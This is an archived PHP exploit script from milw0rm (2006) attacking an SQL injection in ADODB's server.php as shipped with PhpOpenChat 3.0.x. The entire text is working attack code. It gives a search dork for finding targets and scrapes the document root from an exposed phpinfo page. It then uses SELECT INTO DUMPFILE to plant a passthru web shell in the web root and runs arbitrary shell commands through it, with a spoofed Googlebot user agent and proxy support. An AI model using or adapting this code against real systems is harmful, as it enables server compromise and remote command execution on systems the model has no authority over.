<html><head><title>ADODB < 4.70 (PhpOpenChat 3.0.x) Server.php SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;PhpOpenChat 3.0.x ADODB Server.php \&quot;sql\&quot; SQL injection\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n\r\n&quot;;
echo &quot;dork: Welcome to your PHPOpenChat-Installation!\r\n\r\n&quot;;

if ($argc&lt;4) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path cmd OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to PhpOpenChat\r\n&quot;;
echo &quot;cmd:       a shell command\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /chat/ \r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /chat/ ls -la -p81\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost / ls -la -P1.1.1.1:80\r\n&quot;;
die;
}
/*
 this is based on

 http://www.securityfocus.com/bid/16187

 but... look at the server.php source code:

...
$driver = 'mysql';
$host = 'localhost'; // DSN for odbc
$uid = 'root';
$pwd = '';
$database = 'test';
...

you need a &quot;root&quot; user with no password, an existent &quot;test&quot; database
and Mysql to have certain rights to write files...
so, this vulnerability is very hard to exploit
however, here is the code for PhpOpenChat, you can easily change it to work
against the program you want
									      */
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

$host=$argv[1];
$path=$argv[2];
$action=$argv[3];
$cmd=&quot;&quot;;$port=80;$proxy=&quot;&quot;;

for ($i=3; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
$cmd=urlencode($cmd);

if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

#step 1-&gt;read DOCUMENT ROOT from phpinfo
$packet =&quot;GET &quot;.$p.&quot;include/adodb/tests/tmssql.php?do=phpinfo HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;DOCUMENT_ROOT &lt;/td&gt;&lt;td class=\&quot;v\&quot;&gt;&quot;,$html);
$temp2=explode(&quot; &lt;/td&gt;&lt;/tr&gt;&quot;,$temp[1]);
$fullpath=$temp2[0];
$fullpath=trim($fullpath);
echo &quot;DOCUMENT ROOT -&gt;&quot;.$fullpath.&quot;\r\n\r\n&quot;;
$fullpath=str_replace(&quot;\\&quot;,&quot;\\\\\\\\&quot;,$fullpath); // win boxes
if ($fullpath==&quot;&quot;)
{
echo $html;
die(&quot;\r\n\r\nCannot read phpinfo ...\r\n&quot;);
}

#step 2-&gt;execute a query (you can regardless of magic_quotes_gpc)
$SQL =&quot;SELECT '&lt;?php echo chr(0x2a).\&quot;delim*\&quot;;passthru(\$_GET[\&quot;cmd\&quot;]);echo chr(0x2a).\&quot;delim*\&quot;;?&gt;',0,0,0,0,0 &quot;;
$SQL.=&quot;INTO DUMPFILE '&quot;.$fullpath.&quot;/suntzu.php' FROM poc.poc_user_account LIMIT 1&quot;;
$SQL=urlencode($SQL);
$packet =&quot;GET &quot;.$p.&quot;include/adodb/server.php?sql=$SQL HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;Access denied&quot;) || !strstr($html,&quot;200 OK&quot;) || strstr($html,&quot;Can't connect&quot;))
{
echo $html;
die(&quot;\r\n\r\nExploit failed...\r\n&quot;);
}
sleep(1);
#step 3-&gt;launch commands
$packet =&quot;GET /suntzu.php?cmd=&quot;.$cmd.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (!strstr($html,&quot;*delim*&quot;))
{
echo $html;
die(&quot;\r\n\r\nExploit failed...\r\n&quot;);
}
else
{
echo &quot;Exploit succeeded...\r\n&quot;;
$temp=explode(&quot;*delim*&quot;,$html);
echo $temp[1];
}
?&gt;

# milw0rm.com [2006-04-09]</pre></html>